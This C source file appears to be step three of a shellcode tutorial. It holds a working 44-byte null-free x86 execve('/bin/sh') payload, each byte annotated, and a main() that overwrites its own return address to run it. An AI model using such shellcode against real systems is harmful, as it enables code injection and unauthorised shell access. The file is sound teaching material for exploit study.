//
// nfshellcode.c
//
// Step 3: making a shellcode from Step 2 null free
//
// sizeof shellcode: 44 bytes without trailing null
//

#include <string.h>

// The stack layout of the main function at the moment it is entered follows below.
// The amount of spaces reflects the actual amount of bytes. Dots in buffers
// are the data bytes, and spaces are the stack padding placed by the compiler.
//     ret - address to which the processor will transfer its execution after
//           leaving the function
//     sfp - Stored Frame Pointer or EBP of the previous function that called main()
//
// bottom of                                                            top of
// memory                                                               memory
//                    _ret  sfp   ret   argc  argv  argp
// <------           [    ][    ][    ][    ][    ][    ]
//                   ^     ^
//                  esp   ebp
// top of                                                            bottom of
// stack                                                                 stack

// Removing null bytes from the shellcode created at Step 2 decreased its size from
// 68 to 44 bytes. Note, that I had to get rid of the usage of code labels to compute
// the offsets to argv[] array after the executable code. That's because assembler
// generates 4-byte-sized immediate operands extended with zeroes.
// Here is the difference:
//     movl %esi, 4f-3f(%esi) ---> 89 b6 08 00 00 00
// and
//     movl %esi, 0x8(%esi)   ---> 89 76 08

// Note, that exit(0) call in the shell code is not compulsory, it is there in
// order to terminate program gracefully, if execve(/bin/sh) failed for some
// reason. exit(0) call adds 6 bytes to the shellcode.

char shellcode_buffer[128];

__attribute__ ((naked)) void shellcode_function() {
    __asm__ (
        "jmp     1f                   \n\t"    // eb 1e                         : 2  bytes - jump to the label of call instruction below
        "2:                           \n\t"    //                                 0  bytes - label to be returned to from call instruction below
        "popl    %esi                 \n\t"    // 5e                            : 1  byte  - capture the absolute address of the /bin/sh string in memory
        "xorl    %eax, %eax           \n\t"    // 31 c0                         : 2  bytes - eax = 0
        "movb    %al, 0x7(%esi)       \n\t"    // 88 46 07                      : 4  bytes - this instruction is crucial, it terminates the /bin/sh with zero
        "movl    %esi, 0x8(%esi)      \n\t"    // 89 76 08                      : 3  bytes - store address of /bin/sh in argv[0] right after our shellcode
        "movl    %eax, 0xc(%esi)      \n\t"    // 89 46 0c                      : 3  bytes - store null pointer address in argv[1]
        "movb    $0xb, %al            \n\t"    // b0 0b                         : 2  bytes - eax = 11, index of exec in system call table
        "movl    %esi, %ebx           \n\t"    // 89 f3                         : 2  bytes - esi = address of /bin/sh
        "leal    0x8(%esi), %ecx      \n\t"    // 8d 4e 08                      : 3  bytes - ecx = address of address of /bin/sh
        "leal    0xc(%esi), %edx      \n\t"    // 8d 56 0c                      : 3  bytes - edx = address of address of NULL
        "int     $0x80                \n\t"    // cd 80                         : 2  bytes - execve(/bin/sh) system call
        "movb    $0x1, %al            \n\t"    // b0 01                         : 2  bytes - eax = 1, index of exit service in system call table
        "xorl    %ebx, %ebx           \n\t"    // 31 db                         : 2  bytes - ebx = 0, exit status code, that means success
        "int     $0x80                \n\t"    // cd 80                         : 2  bytes - exit(0) system call
        "1:                           \n\t"    //                                 0  bytes - label to be jumped to from the first jmp instruction
        "call    2b                   \n\t"    // e8 dd ff ff ff                : 5  bytes - push the address of the next instruction which is actually a string /bin/sh
        ".string \"/bin/sh\"          \n\t"    // 2f 62 69 6e 2f 73 68 00       : 8  bytes - '/', 'b', 'i', 'n', '/', 's', 'h', '\0'
    );
}

void main() {
    int* _ret;

    // copy the executable code from the code section to the global static buffer, where the code has RWX permissions
    memcpy(shellcode_buffer, shellcode_function, (char*)main - (char*)shellcode_function);

    // obtain the offset in the stack of the return address from main (the ret variable in the diagram above)
    _ret = (int*)&_ret + 2;

    // set the return address in the stack to point to our shellcode buffer
    *_ret = (int)shellcode_buffer;
}
